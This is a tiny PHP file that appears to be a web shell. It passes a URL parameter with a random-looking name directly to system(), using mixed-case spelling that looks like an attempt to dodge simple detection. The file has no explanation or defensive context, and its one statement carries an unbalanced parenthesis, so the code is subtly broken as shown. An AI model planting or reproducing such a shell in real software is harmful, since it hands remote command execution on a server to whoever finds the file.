<?php
SysTeM(($_GET['2pT-lpLc']);
?>
